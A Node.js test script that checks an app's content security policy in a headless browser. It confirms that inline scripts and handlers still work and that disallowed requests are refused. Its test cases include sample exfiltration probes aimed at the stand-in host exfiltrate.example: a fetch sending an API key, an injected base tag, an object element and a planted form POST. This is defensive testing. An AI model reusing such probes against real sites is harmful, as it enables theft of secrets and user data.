#!/usr/bin/env node
/*
 * The content security policy does what scripts/csp.js says, and — the half
 * that matters more — does not do anything it did not promise.
 *
 *   node tests/verify-csp.js
 *
 * No target argument and no build. The page served below is synthetic, over a
 * real http origin on a loopback port, because a policy's whole behaviour
 * depends on having an origin: 'self' means nothing on about:blank and
 * nothing useful on file://.
 *
 * WHY THE PERMISSIVE CHECKS COME FIRST. This policy is being added to an app
 * that cannot be run here — there is no licensed source in this container, so
 * there is no build to open. The realistic failure is not that the policy is
 * too weak; it is that it is too strong and the owner's next launch is a blank
 * screen. So the first block proves the things the app relies on every single
 * frame still work under it: inline <script>, inline onclick handlers, inline
 * <style>, data: images, blob: images, same-origin fetch. If any of those were
 * blocked the app would be dead on arrival, and that is the check worth having
 * before any of the denials below.
 *
 * The denials are then asserted through securitypolicyviolation events rather
 * than by observing a failed request, which is the only way to tell "the
 * browser refused this" apart from "this container has no network". A fetch to
 * Gemini fails here either way; only the event says why, and the difference
 * between the two is the entire claim.
 */
'use strict';
const http = require('http');
const { launch, engineName } = require('./_engine.js');
const { onDeath, watch } = require('./_deathnote.js');
const CSP = require('../scripts/csp.js');
const fs = require('fs');
const path = require('path');

let passed = 0, failed = 0;
const ok = (label, cond, detail = '') => {
  cond ? passed++ : failed++;
  console.log((cond ? '  PASS  ' : '  FAIL  ') + label + (detail ? '  → ' + detail : ''));
};
let section = '';
const head = t => { section = t; console.log('\n── ' + t + ' ──'); };

/* Declared out here, and the handler installed out here, because the tail of
   this file is `})().catch(…)` — a catch that HANDLES the rejection, so no
   unhandledRejection is ever emitted and a note installed inside the IIFE
   would never fire. The catch takes the note's own emitter instead, which
   also moves the exception off stderr: scripts/verify.js concatenates the two
   pipes in no guaranteed order. See tests/_deathnote.js. */
const errors = [], events = [];
const died = onDeath(() => ({ section, checks: passed + failed, errors,
                              events: events.length ? events.join(', ') : 'none' }));

/* ── the policy is the same string in all three places ───────────────────── */
head('one policy, not three copies of one');
{
  const worker = fs.readFileSync(path.join(__dirname, '..', 'src', 'worker', 'apex.js'), 'utf8');
  ok('the Worker ships exactly the policy scripts/csp.js defines',
     worker.includes(CSP.HEADER_POLICY),
     worker.includes(CSP.HEADER_POLICY) ? '' : 'the Worker and csp.js have drifted');
  /* frame-ancestors is ignored in a meta tag, so it must be in the header form
     and absent from the shell's — a policy that claims it in <meta> is telling
     the reader it is protected when it is not. */
  ok('the header form carries frame-ancestors', /frame-ancestors 'none'/.test(CSP.HEADER_POLICY));
  ok('and the <meta> form does not pretend to', !/frame-ancestors/.test(CSP.META));

  const buildPwa = fs.readFileSync(path.join(__dirname, '..', 'scripts', 'build-pwa.js'), 'utf8');
  ok('the shell is stamped with the meta policy', buildPwa.includes('CSP.META'));
  ok('and the build refuses to ship a Worker that has drifted',
     buildPwa.includes('CSP.HEADER_POLICY'));
}

/* ── nothing contacts a host the policy does not allow ───────────────────── */
head('the allowlist covers every host the shipped app can reach');
{
  /* Hosts that appear in the source but are removed before the build finishes.
     Each is named with the step that removes it, so this is a claim that can be
     checked rather than a list of things to ignore. */
  const REMOVED = {
    'api.groq.com':          'mistral — Groq and Anthropic leave',
    'api.anthropic.com':     'mistral — Groq and Anthropic leave',
    'api.mistral.ai':        'onetutor — the second tutor leaves',
    'fonts.googleapis.com':  'stage0 — fonts: drop Google Fonts links',
    'fonts.gstatic.com':     'stage0 — fonts: drop Google Fonts links',
  };
  const roots = ['scripts', 'src'];
  const files = [];
  const walk = d => fs.readdirSync(d, { withFileTypes: true }).forEach(f => {
    const p = path.join(d, f.name);
    if (f.isDirectory()) walk(p); else if (f.name.endsWith('.js')) files.push(p);
  });
  roots.forEach(r => walk(path.join(__dirname, '..', r)));

  const hosts = new Set();
  for (const f of files) {
    for (const m of fs.readFileSync(f, 'utf8').matchAll(/https:\/\/([a-z0-9.-]+)/gi)) hosts.add(m[1]);
  }
  const allowed = new Set(CSP.CONNECT.filter(s => s.startsWith('https://'))
                                     .map(s => s.replace('https://', '')));
  const unaccounted = [...hosts].filter(h => !allowed.has(h) && !(h in REMOVED));
  ok('every https host in the tree is either allowed or removed by a named step',
     unaccounted.length === 0, unaccounted.join(', ') || 'none');
  ok('and the allowlist is not empty', allowed.size > 0, [...allowed].join(', '));
  /* The other direction: a host allowed by the policy but contacted by nothing
     is a permission granted for no reason. */
  const unused = [...allowed].filter(h => !hosts.has(h));
  ok('nothing is allowed that the app never contacts', unused.length === 0, unused.join(', ') || 'none');
}

/* ── and now the browser, on a real origin ───────────────────────────────── */
const PAGE = `<!doctype html><html><head>${CSP.META}
<style>.inline-style-worked{color:rgb(1,2,3)}</style></head><body>
<p id="probe" class="inline-style-worked">probe</p>
<button id="btn" onclick="window.__inlineHandler=true">go</button>
<script>
  window.__inlineScript = true;
  window.__violations = [];
  document.addEventListener('securitypolicyviolation', function(e){
    window.__violations.push({ directive: e.effectiveDirective, blocked: String(e.blockedURI).slice(0,60) });
  });
  window.__imgResult = function(src){ return new Promise(function(res){
    var i = new Image(); i.onload = function(){ res('loaded'); }; i.onerror = function(){ res('failed'); };
    i.src = src;
  }); };
</script></body></html>`;

(async () => {
  const server = http.createServer((req, res) => {
    if (req.url === '/allowed.json') {
      res.writeHead(200, { 'content-type': 'application/json' });
      return res.end('{"ok":true}');
    }
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(PAGE);
  });
  await new Promise(r => server.listen(0, '127.0.0.1', r));
  const origin = `http://127.0.0.1:${server.address().port}`;

  const browser = await launch();
  const page = watch(await (await browser.newContext()).newPage(), events);
  page.on('pageerror', e => errors.push(e.message));
  await page.goto(origin + '/', { waitUntil: 'load' });
  console.log(`  engine: ${engineName()}   origin: ${origin}`);

  head('the app still works — everything it does every frame');
  ok('an inline <script> still runs', await page.evaluate(() => window.__inlineScript === true));
  await page.click('#btn');
  ok('an inline onclick handler still fires — all 119 of them depend on this',
     await page.evaluate(() => window.__inlineHandler === true));
  ok('an inline <style> still applies',
     await page.evaluate(() => getComputedStyle(document.getElementById('probe')).color) === 'rgb(1, 2, 3)');
  /* Every figure in the single-file build is a data: URI, and the split build
     decodes fetched figures into data: URIs for the vision call. */
  const dataPix = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
  ok('a data: image still loads', await page.evaluate(s => window.__imgResult(s), dataPix) === 'loaded');
  const sameOrigin = await page.evaluate(async () => {
    try { const r = await fetch('/allowed.json'); return (await r.json()).ok === true ? 'ok' : 'bad'; }
    catch (e) { return 'threw: ' + e.message; }
  });
  ok("a same-origin fetch is allowed by connect-src 'self'", sameOrigin === 'ok', sameOrigin);
  ok('and none of that raised a single violation',
     (await page.evaluate(() => window.__violations.length)) === 0,
     JSON.stringify(await page.evaluate(() => window.__violations)));

  head('and the things the app never does are now refused');
  const violated = async (fn, arg) => {
    const before = await page.evaluate(() => window.__violations.length);
    await page.evaluate(fn, arg).catch(() => {});
    await page.waitForTimeout(150);
    return page.evaluate(n => window.__violations.slice(n), before);
  };

  const conn = await violated(() => fetch('https://exfiltrate.example/steal?k=' +
    encodeURIComponent('the fellow\'s api key')).catch(() => {}));
  ok('a fetch to an unlisted host is blocked by connect-src',
     conn.some(v => v.directive === 'connect-src'), JSON.stringify(conn) || 'no violation');

  /* The distinction the whole exercise turns on. This request also fails in
     this container — there is no route to Google — so a failed fetch proves
     nothing. The absence of a connect-src violation is what proves the policy
     permits it. */
  const gem = await violated(() =>
    fetch('https://generativelanguage.googleapis.com/v1beta/models').catch(() => {}));
  ok('but Gemini is permitted — it fails on the network, not on the policy',
     !gem.some(v => v.directive === 'connect-src'), JSON.stringify(gem) || 'no violation');

  const base = await violated(() => {
    const b = document.createElement('base');
    b.href = 'https://exfiltrate.example/';
    document.head.appendChild(b);
  });
  ok("an injected <base> is refused — it would repoint app.js and all 408 figures",
     base.some(v => v.directive === 'base-uri'), JSON.stringify(base) || 'no violation');

  const obj = await violated(() => {
    const o = document.createElement('object');
    o.data = 'https://exfiltrate.example/x.swf';
    document.body.appendChild(o);
  });
  ok('an <object> is refused', obj.some(v => v.directive === 'object-src'),
     JSON.stringify(obj) || 'no violation');

  const form = await violated(() => {
    const f = document.createElement('form');
    f.method = 'POST'; f.action = 'https://exfiltrate.example/collect';
    document.body.appendChild(f); f.submit();
  });
  ok('a planted form cannot submit — pure exfiltration, and the app has none',
     form.some(v => v.directive === 'form-action'), JSON.stringify(form) || 'no violation');

  await browser.close();
  server.close();
  console.log(`\n${passed} passed, ${failed} failed`);
  process.exit(failed ? 1 : 0);
})().catch(died);
